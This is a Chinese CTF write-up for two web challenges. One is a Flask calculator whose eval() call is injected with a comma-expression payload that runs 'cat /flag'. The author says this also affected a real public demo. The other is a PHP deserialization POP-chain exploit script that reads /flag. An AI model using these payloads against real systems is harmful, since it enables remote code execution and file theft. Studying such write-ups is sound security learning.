## web1
这道题原本是兰州大学校赛的题目,比较有意思的是这是一个真实的项目，并且作者部署了一个demo。最初我测试的时候demo应该是有一个waf的，后来不知道为什么没有了，直接可以rce，已经跟作者反映过了

* 在右上角点Fork me on Github就可以访问到该项目的github主页，得到源码。看看app.py
```python
# -*- coding: utf-8 -*-
"""
    Calculator

    A simple Calculator made by Flask and jQuery.

    :copyright: (c) 2015 by Grey li.
    :license: MIT, see LICENSE for more details.
"""
import re #导入python的正则表达式模块
from flask import Flask, jsonify, render_template, request
# 导入flask的一些模块

app = Flask(__name__) #实例化了一个Flask类


@app.route('/_calculate') #设置了一个路由，也就是如果访问了/_calculate，就会执行下面的calculate函数
def calculate():
    a = request.args.get('number1', '0') #获得number1这个get参数,如果没有该参数则a设为0，下面的两行也是类似的
    operator = request.args.get('operator', '+')
    b = request.args.get('number2', '0')
    m = re.match('-?\d+', a) #使用正则表达式进行匹配，这个正则的意思是匹配0个或1个负号加上1个或多个数字
    n = re.match('-?\d+', b)
    # 如果m没有匹配到东西或者n不是4中操作符的话就返回一个错误
    if m is None or n is None or operator not in '+-*/':
        return jsonify(result='I Catch a BUG!')
    #进行计算
    if operator == '/':
        result = eval(a + operator + str(float(b)))
    else:
        result = eval(a + operator + b)
 # eval函数会执行把参数当作代码进行执行，是一个非常危险的函数
 #这里是想执行类似123+123这样的表达式
    return jsonify(result=result) #把计算的结果以返回回去


@app.route('/') #另一个路由，访问/时会执行下面的index函数
def index():
    return render_template('index.html') #渲染模板文件，其实就是显示了那个计算器的页面


if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0') #启动flask
```
* 代码中添加了注释，可以对照注释理解一下代码
* 显然这里是要利用eval去执行我们想要的python代码，而这有几个阻碍:
    1. 正则表达式的匹配
    ```python
    m = re.match('-?\d+', a) #使用正则表达式进行匹配，这个正则的意思是匹配0个或1个负号加上1个或多个数字
    n = re.match('-?\d+', b)
    # 如果m没有匹配到东西或者n不是4中操作符的话就返回一个错误
    if m is None or n is None or operator not in '+-*/':
        return jsonify(result='I Catch a BUG!')
    ```
    * 仔细阅读代码可以发现后面带进eval的是变量a和b,因此只要匹配成功就可以带进eval
    * 本地尝试一下下面的几个例子可以发现只要是以数字开头的字符串都可以匹配成功，带进eval里执行
    ```python
    re.match('-?\d+','123')
    re.match('-?\d+','abc')
    re.match('-?\d+','123abc')
     re.match('-?\d+','abc123')
    ```
    2. 数字开头怎么执行代码
    可以使用逗号表达式,比如
    ```python
     eval('123,print("wxynb!")')
    ```
    会输出
    >wxynb!
    (123, None)

    3. 类型转换问题 
    因为a和b之间还有一个运算符operator,所以会报错。
    可以在a那里把operator和b注释掉
    ```python
    eval('123,print(123)'+'+'+'123')
    #报错TypeError: unsupported operand type(s) for +: 'NoneType' and 'int'
    eval('123,print(123)#'+'+'+'123')
    #加了一个注释符#，成功执行
    ```

* python执行系统命令,用于读flag
```python
''.join(__import__('os').popen('cat /flag').readlines())
```
* 最后的payload(url编码后):
```
?number1=123%2C%27%27.join%28__import__%28%27os%27%29.popen%28%27cat%20%2fflag%27%29.readlines%28%29%29%23&operator=/&number2=123
```

## web2
耿佬嫖来的题,难度比较大
### 预期解
.....此处省略一千字
### 非预期解
1. 复制其中代码，百度搜索(没错是百度搜到的。。),打开第一个结果https://www.cnblogs.com/BOHB-yunying/p/11839385.html
2. 代码几乎一样,只要把最后的exp改动一下即可
```php
<?php
class Read {
    private $var="/flag";
    //文章中的是public
}
 
class Show
{
    public $source;
    public $str;
}
 
class Test
{
 
    public $params; //文章中叫$p
}
$a=new Show();
$a->source=$a; //触发__toString
$a->str['str']=new Test();
$a->str['str']->params=new Read(); //这里也要把$p改成$params
echo urlencode(serialize($a)); 
```
* 这题具体的原理部分可以看看查到的那篇文章，或者问万能的耿佬
